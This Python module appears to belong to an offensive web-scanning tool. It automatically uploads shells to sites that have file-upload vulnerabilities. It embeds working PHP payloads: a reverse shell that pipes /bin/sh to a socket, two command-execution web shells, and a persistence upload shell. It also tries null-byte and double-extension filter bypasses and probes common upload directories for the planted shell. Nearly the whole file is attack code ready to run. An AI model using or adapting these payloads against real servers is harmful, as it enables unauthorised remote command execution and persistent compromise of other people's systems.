"""
Auto-Shell Uploader for Web Mode
Automatically generates and uploads shells when file upload vulnerabilities are detected
"""

import asyncio
import logging
import random
import string
from typing import Dict, Any, List, Optional
from pathlib import Path
import httpx
from datetime import datetime
import json

class AutoShellUploader:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.upload_results = []
        self.shell_payloads_dir = Path("post_exploitation/payloads")
        self.shell_payloads_dir.mkdir(exist_ok=True)
        
        # Common upload paths to test
        self.upload_paths = [
            "/uploads/",
            "/files/",
            "/img/",
            "/images/",
            "/media/",
            "/tmp/",
            "/cache/",
            "/static/",
            "/assets/",
            "/user_uploads/"
        ]
        
        # File extensions to try
        self.bypass_extensions = [
            ".php",
            ".php;.jpg",
            ".php;.png",
            ".phtml",
            ".php3",
            ".php4",
            ".php5",
            ".php7",
            ".phar",
            ".php.jpg",
            ".php.png",
            ".php.gif",
            ".php%00.jpg",
            ".php%00.png"
        ]
        
    async def handle_upload_vulnerability(self, finding: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Handle file upload vulnerability by generating and uploading shells"""
        logging.info(f"Auto-shell uploader triggered for {finding.get('url', 'unknown')}")
        
        results = []
        
        try:
            # Generate shell payloads
            shell_payloads = await self._generate_shell_payloads(finding)
            
            # Upload each shell with different bypass techniques
            for shell_payload in shell_payloads:
                upload_result = await self._upload_shell(finding, shell_payload)
                if upload_result:
                    results.append(upload_result)
                    
                    # Test access to uploaded shell
                    access_result = await self._test_shell_access(upload_result)
                    if access_result:
                        results.append(access_result)
            
            # Log results
            self._log_upload_results(results)
            
        except Exception as e:
            logging.error(f"Auto-shell uploader failed: {e}")
        
        return results
    
    async def _generate_shell_payloads(self, finding: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate various shell payloads"""
        shells = []
        
        # PHP Reverse Shell
        reverse_shell = self._generate_php_reverse_shell()
        shells.append({
            'name': 'php_reverse_shell',
            'content': reverse_shell,
            'extension': '.php',
            'description': 'PHP reverse shell for remote access'
        })
        
        # PHP Web Shell
        webshell = self._generate_php_webshell()
        shells.append({
            'name': 'php_webshell',
            'content': webshell,
            'extension': '.php',
            'description': 'PHP web shell for command execution'
        })
        
        # Simple Command Execution
        cmd_shell = self._generate_cmd_shell()
        shells.append({
            'name': 'cmd_shell',
            'content': cmd_shell,
            'extension': '.php',
            'description': 'Simple command execution shell'
        })
        
        # File Upload Shell
        upload_shell = self._generate_upload_shell()
        shells.append({
            'name': 'upload_shell',
            'content': upload_shell,
            'extension': '.php',
            'description': 'File upload shell for persistence'
        })
        
        return shells
    
    def _generate_php_reverse_shell(self) -> str:
        """Generate PHP reverse shell"""
        return '''<?php
// PHP Reverse Shell
$ip = "127.0.0.1";
$port = 4444;

$sock = fsockopen($ip, $port);
if (!$sock) {
    die("Connection failed");
}

$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);

$process = proc_open("/bin/sh", $descriptorspec, $pipes);
proc_close($process);
?>'''
    
    def _generate_php_webshell(self) -> str:
        """Generate PHP web shell"""
        return '''<?php
// PHP Web Shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>'''
    
    def _generate_cmd_shell(self) -> str:
        """Generate simple command execution shell"""
        return '''<?php
// Simple Command Execution
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    system($cmd);
}
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Run">
</form>'''
    
    def _generate_upload_shell(self) -> str:
        """Generate file upload shell"""
        return '''<?php
// File Upload Shell
if(isset($_FILES['file'])) {
    $upload_dir = "./";
    $upload_file = $upload_dir . basename($_FILES['file']['name']);
    
    if(move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "File uploaded: " . $upload_file;
    } else {
        echo "Upload failed";
    }
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>'''
    
    async def _upload_shell(self, finding: Dict[str, Any], shell_payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Upload shell with various bypass techniques"""
        url = finding.get('url', '')
        parameter = finding.get('parameter', 'file')
        
        for extension in self.bypass_extensions:
            try:
                # Create filename with bypass extension
                filename = f"{shell_payload['name']}{extension}"
                
                # Prepare upload data
                files = {
                    parameter: (filename, shell_payload['content'], 'text/plain')
                }
                
                # Try to upload
                async with httpx.AsyncClient(timeout=10, verify=False) as client:
                    response = await client.post(url, files=files)
                    
                    if response.status_code in [200, 201, 302]:
                        result = {
                            'type': 'shell_upload',
                            'url': url,
                            'parameter': parameter,
                            'filename': filename,
                            'extension': extension,
                            'shell_type': shell_payload['name'],
                            'status_code': response.status_code,
                            'response_text': response.text[:500],
                            'timestamp': datetime.now().isoformat(),
                            'description': f"Shell uploaded: {shell_payload['description']}"
                        }
                        
                        logging.info(f"Shell uploaded successfully: {filename}")
                        return result
                        
            except Exception as e:
                logging.debug(f"Upload failed for {extension}: {e}")
                continue
        
        return None
    
    async def _test_shell_access(self, upload_result: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test access to uploaded shell"""
        filename = upload_result.get('filename', '')
        base_url = upload_result.get('url', '').split('?')[0]  # Remove query params
        
        for upload_path in self.upload_paths:
            try:
                test_url = f"{base_url}{upload_path}{filename}"
                
                async with httpx.AsyncClient(timeout=10, verify=False) as client:
                    response = await client.get(test_url)
                    
                    if response.status_code == 200:
                        result = {
                            'type': 'shell_access',
                            'url': test_url,
                            'filename': filename,
                            'status_code': response.status_code,
                            'response_length': len(response.text),
                            'timestamp': datetime.now().isoformat(),
                            'description': f"Shell accessible at: {test_url}"
                        }
                        
                        logging.info(f"Shell accessible: {test_url}")
                        return result
                        
            except Exception as e:
                logging.debug(f"Access test failed for {upload_path}: {e}")
                continue
        
        return None
    
    def _log_upload_results(self, results: List[Dict[str, Any]]):
        """Log upload results to file"""
        try:
            log_file = Path("logs/auto_shell_uploads.json")
            log_file.parent.mkdir(exist_ok=True)
            
            # Load existing logs
            existing_logs = []
            if log_file.exists():
                with open(log_file, 'r') as f:
                    existing_logs = json.load(f)
            
            # Add new results
            for result in results:
                existing_logs.append(result)
            
            # Save updated logs
            with open(log_file, 'w') as f:
                json.dump(existing_logs, f, indent=2)
                
            logging.info(f"Auto-shell upload results logged to {log_file}")
            
        except Exception as e:
            logging.error(f"Failed to log upload results: {e}")
    
    def get_upload_statistics(self) -> Dict[str, Any]:
        """Get upload statistics"""
        return {
            'total_uploads': len(self.upload_results),
            'successful_uploads': len([r for r in self.upload_results if r.get('type') == 'shell_upload']),
            'accessible_shells': len([r for r in self.upload_results if r.get('type') == 'shell_access']),
            'shell_types': list(set(r.get('shell_type', '') for r in self.upload_results)),
            'bypass_extensions_used': list(set(r.get('extension', '') for r in self.upload_results))
        } 